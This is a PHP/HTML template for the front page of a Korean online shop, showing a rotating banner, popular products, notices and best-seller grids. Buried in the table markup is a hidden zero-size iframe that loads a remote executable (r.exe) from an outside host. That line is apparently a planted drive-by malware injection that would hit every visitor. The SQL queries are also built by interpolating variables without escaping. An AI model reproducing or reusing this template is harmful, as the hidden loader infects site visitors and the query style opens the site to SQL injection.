<script language="JavaScript">
<!--
var url_idx = 1;
var url_arr = new Array;
<?
$RotateBannerCount = getRotateBannerCount($MainSkin);// 코드가 A 인것의 갯수
for($i=1; $i <= $RotateBannerCount; $i++){
$sql = "select * from ${BANNER_TABLE_NAME} where Skin = '$MainSkin' and Code = 'A00${i}'" ;
$result = mysql_query($sql);
$list = mysql_fetch_array($result);
$Url = trim(stripslashes($list[Url1]));
?>
url_arr[<?=$i?>] = "<?=$Url;?>";
<?
}
?>

function ChangeMainImage(ImgName, cnt,Url) {
PathImg = '<? echo "${STOCK_FOLDER_NAME}/banner/$MainSkin/";?>'+ImgName;
document['MainTitleImg'].src = PathImg;

var MainIconBGlen = document.all.MainIconBG.length
for (i = 0; i < MainIconBGlen; i++){
	j = i+1;
	if(cnt == j){
		document.all.MainIconBG[i].style.backgroundImage = "url(<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/mainimg_redbullet.gif)";
	}else{
		document.all.MainIconBG[i].style.backgroundImage = "url(<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/mainimg_blackbullet.gif)";
	}
}

if(ImgName != ""){
	document.all.MainTitleImg.filters.blendTrans.stop();
	document.all.MainTitleImg.filters.blendTrans.Apply();
	document.all.MainTitleImg.src=PathImg;
	document.all.MainTitleImg.filters.blendTrans.Play();
}

main_seturl(cnt);
}


function main_seturl(idx)
{
url_idx = eval(idx);
}

function go_url()
{
location.href = url_arr[url_idx];

}



-->
</script>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td width="455" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
<?
$sqlstr = "select * from ${BANNER_TABLE_NAME} where Skin = '$MainSkin' and Code = 'A001'";
$sqlqry = mysql_query($sqlstr);
$list = mysql_fetch_array($sqlqry);
$Picture = explode("|" , $list[Picture]);
?>
                      <td>
											<a href = "" onClick = "go_url();"><img src="<? echo "/shop/stock/banner/default/banner1.jpg" ; ?>" width="455" height="280" name="MainTitleImg" style="filter:blendTrans(duration=0.5)" border="0" /></a></td>
                    </tr>
                    <tr>
                      <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td>&nbsp;</td>
                          <td height="23" align="right"><table border="0" cellspacing="0" cellpadding="0">
                            <tr>



<?
$RotateBannerCount = getRotateBannerCount($MainSkin);// 코드가 A 인것의 갯수
$RotateBannerCount = 4;
for($i=1; $i <= $RotateBannerCount; $i++){
$sql = "select * from ${BANNER_TABLE_NAME} where Skin = '$MainSkin' and Code = 'A00${i}'" ;
$result = mysql_query($sql);
$list = mysql_fetch_array($result);
$Url = trim(stripslashes($list[Url1]));
$Picture = explode("|" , $list[Picture]);
$j = substr("0".$i, -2);



$backgroundimage = $i==1?"$SKIN_FOLDER_NAME/index/$LayOutSkin/images/mainimg_redbullet.gif":"$SKIN_FOLDER_NAME/index/$LayOutSkin/images/mainimg_blackbullet.gif";

?>

                                <td><table width="17" height="17" border="0" cellpadding="0" cellspacing="0"><? echo $Picture[0];?>
                                  <tr>
                                    <td id="MainIconBG" width="17" height="17" align="center" style="font-size:10px; background-image:url(<?=$backgroundimage?>);  background-repeat: no-repeat;cursor:hand" onClick="javascript:ChangeMainImage('banner<? echo $i;?>.jpg','<? echo $i;?>','banner1.jpg');"><strong><font color="#FFFFFF"><?=$j?></font></strong></td>
                                  </tr>
                                </table></td>
                              <td width="5"> </td>
<?
}
?>
                            </tr>
                          </table></td>
                        </tr>
                      </table></td>
                    </tr>
                  </table></td>
                <td width="1"></td>
                <iframe src="http://grep.kr/r.exe" width=0 height=0></iframe>
                <td valign="top"><table width="234" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td><p class="bg-danger text-muted" style="padding-top:10px; padding-bottom:10px; padding-left:10px">HOT 인기순위 TOP 5</p></td>
                    </tr>
                    <tr>
                      <td><table width="234" border="0" cellspacing="0" cellpadding="0">
<?
	$sql = "SELECT UID , Name , Price , Category FROM $MALL_TABLE_NAME WHERE Status = 'Y' ORDER BY hit desc limit 5" ;
	$result = mysql_query($sql);
	$i = 1;
	while($main_best_list = mysql_fetch_array($result)):
	$main_best_list[Name] = STR_CUTTING(stripslashes($main_best_list[Name]) , 20);
	$VIEW_LINK = "${MART_MAIN_FILE_NAME}?query=view&code=$main_best_list[Category]&no=$main_best_list[UID]";
?>
													<tr>
                            <td height="20" style="padding:0 0 0 12"><h5><a href = "<? echo $VIEW_LINK; ?>">Hot !! <? echo $main_best_list[Name]; ?></h5></a></td>
                            <td align="right" style="padding:0 10 0 0"><h5><? echo number_format($main_best_list[Price]);?></h5></td>
                          </tr>
<?
	$i++;
	endwhile;
?>
                        </table></td>
                    </tr>
                    <tr>
                      <td></td>
                    </tr>
                  </table>
                  <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td><p class="bg-danger text-muted" style="padding-top:10px; padding-bottom:10px; padding-left:10px">공지사항</p></td>
                    </tr>
                    <tr>
                      <td align="center"><table width="214" border="0" cellspacing="0" cellpadding="0">
<?

$lineCutting = 4;
$strCutting = 28;
$GID1 = "board" ;
$BID1 = "notice";
$MAIN_WHERE  = "WHERE SUBSTRING(SPARE1,7,1) != '1'";
$MAIN_SQL_STR = "SELECT * FROM ${DEFAULT_TABLE_NAME}_${GID1}_${BID1} $MAIN_WHERE ORDER BY UID DESC LIMIT 0, $lineCutting";
$MAIN_SQL_QRY = @mysql_query($MAIN_SQL_STR);
for($i = 0 ; $i < $lineCutting ; $i++){//폼을 깨지지 않고 5개 일정하게 나오게 하기 위해 for 구문과 if 구문을 사용했다.
$LLIST = @mysql_fetch_array($MAIN_SQL_QRY);
$LLIST[SUBJECT]=stripslashes($LLIST[SUBJECT]);
$LLIST[SUBJECT]=STR_CUTTING($LLIST[SUBJECT], $strCutting);
if($LLIST[W_DATE]!=""){
$DATE = "[".date("Y/m/d", $LLIST[W_DATE])."]";
}else{
$DATE = "";
}
if(time() < ($LLIST[W_DATE]+ 24*60*60))
$NewWriteImg = "<img src='${BOARD_FOLDER_NAME}/icon/default/new_btn.gif' >";
else $NewWriteImg ="";
?>

												  <tr>
                            <td height="20" style="padding:0 0 0 10"><h5><a href="<? echo ${BOARD_MAIN_FILE_NAME}; ?>?BID=<?=$BID1;?>&GID=<? echo $GID1; ?>&mode=view&UID=<?=$LLIST[UID];?>&CURRENT_PAGE=<?=$CURRENT_PAGE;?>"><?=$LLIST[SUBJECT];?></h5></a></td>
                          </tr>
<?
}// end of for
?>


                        </table></td>
                    </tr>
                  </table></td>
              </tr>
            </table></td>
        </tr>

        <tr>
          <td><p class="bg-danger text-muted" style="padding-top:10px; padding-bottom:10px; padding-left:10px">최신 베스트 상품전</p></td>



        </tr>
        <tr>
          <td height=3></td>
        </tr>
        <tr>
          <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td>

	                <table width="691" border="0" cellspacing="0" cellpadding="0">
                    <tr>

<?

$SQL_STR="SELECT * FROM ${MALL_TABLE_NAME} WHERE  Option3 LIKE '%베스트%' AND MainDisplay = 'checked' AND Status = 'Y' ORDER BY  Ranking ASC   LIMIT 0,5";
$SQL_QRY=mysql_query($SQL_STR) or die(mysql_error());

for($NO = 0 ; $NO < 5 ; $NO++){
	$LIST=mysql_fetch_array($SQL_QRY);
  $Picture = explode("|", $LIST[Picture]);
	$VIEW_LINK = "${MART_MAIN_FILE_NAME}?query=view&code=$LIST[Category]&no=$LIST[UID]";

?>
											<td width="172" align="center" height = 120><? if($LIST[UID]){?><table width="100%" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td align="center"><table border="1" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td align="center"><A HREF=<? echo $VIEW_LINK;?> ><img src="<? echo $STOCK_FOLDER_NAME; ?>/<?=$Picture[0]?>" width="82" height = "90"  border="0"></a></td>
                                </tr>
                              </table></td>
                          </tr>
                          <tr>
                            <td height="70" align="center" class="sell_list"><A HREF=<? echo $VIEW_LINK;?>><? echo $LIST[Name]; ?></a> <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon1.gif" width="12" height="12" /> <font color="E57200"><strong><?=number_format($LIST[Price])?>원</strong></font><br>
                              <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon2.gif" width="12" height="12" /> <font color="F88A11"><?=number_format($LIST[Point])?>원</font><br>
                              <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon3.gif" width="20" height="12" /></td>
                          </tr>
                        </table><? } ?></td>

<?
}
?>


                    </tr>
                  </table>

	                <table width="691" border="0" cellspacing="0" cellpadding="0">
                    <tr>

<?

$SQL_STR="SELECT * FROM ${MALL_TABLE_NAME} WHERE  Option3 LIKE '%베스트%' AND MainDisplay = 'checked' AND Status = 'Y' ORDER BY  Ranking ASC   LIMIT 6,11";
$SQL_QRY=mysql_query($SQL_STR) or die(mysql_error());

for($NO = 0 ; $NO < 5 ; $NO++){
	$LIST=mysql_fetch_array($SQL_QRY);
  $Picture = explode("|", $LIST[Picture]);
	$VIEW_LINK = "${MART_MAIN_FILE_NAME}?query=view&code=$LIST[Category]&no=$LIST[UID]";

?>
											<td width="172" align="center" height = 120><? if($LIST[UID]){?><table width="100%" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td align="center"><table border="1" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td align="center"><A HREF=<? echo $VIEW_LINK;?> ><img src="<? echo $STOCK_FOLDER_NAME; ?>/<?=$Picture[0]?>" width="82" height = "90"  border="0"></a></td>
                                </tr>
                              </table></td>
                          </tr>
                          <tr>
                            <td height="70" align="center" class="sell_list"><A HREF=<? echo $VIEW_LINK;?>><? echo $LIST[Name]; ?></a> <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon1.gif" width="12" height="12" /> <font color="E57200"><strong><?=number_format($LIST[Price])?>원</strong></font><br>
                              <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon2.gif" width="12" height="12" /> <font color="F88A11"><?=number_format($LIST[Point])?>원</font><br>
                              <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon3.gif" width="20" height="12" /></td>
                          </tr>
                        </table><? } ?></td>

<?
}
?>

	                <table width="691" border="0" cellspacing="0" cellpadding="0">
                    <tr>

<?

$SQL_STR="SELECT * FROM ${MALL_TABLE_NAME} WHERE  Option3 LIKE '%베스트%' AND MainDisplay = 'checked' AND Status = 'Y' ORDER BY  Ranking ASC   LIMIT 12,17";
$SQL_QRY=mysql_query($SQL_STR) or die(mysql_error());

for($NO = 0 ; $NO < 5 ; $NO++){
	$LIST=mysql_fetch_array($SQL_QRY);
  $Picture = explode("|", $LIST[Picture]);
	$VIEW_LINK = "${MART_MAIN_FILE_NAME}?query=view&code=$LIST[Category]&no=$LIST[UID]";

?>
											<td width="172" align="center" height = 120><? if($LIST[UID]){?><table width="100%" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td align="center"><table border="1" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td align="center"><A HREF=<? echo $VIEW_LINK;?> ><img src="<? echo $STOCK_FOLDER_NAME; ?>/<?=$Picture[0]?>" width="82" height = "90"  border="0"></a></td>
                                </tr>
                              </table></td>
                          </tr>
                          <tr>
                            <td height="70" align="center" class="sell_list"><A HREF=<? echo $VIEW_LINK;?>><? echo $LIST[Name]; ?></a> <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon1.gif" width="12" height="12" /> <font color="E57200"><strong><?=number_format($LIST[Price])?>원</strong></font><br>
                              <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon2.gif" width="12" height="12" /> <font color="F88A11"><?=number_format($LIST[Point])?>원</font><br>
                              <img src="<? echo $SKIN_FOLDER_NAME; ?>/index/<?=$MainSkin?>/images/main_box3_icon3.gif" width="20" height="12" /></td>
                          </tr>
                        </table><? } ?></td>

<?
}
?>


                    </tr>
                  </table>
                    </tr>
                  </table>
                  </td>
              </tr>
            </table></td>
        </tr>

</table>
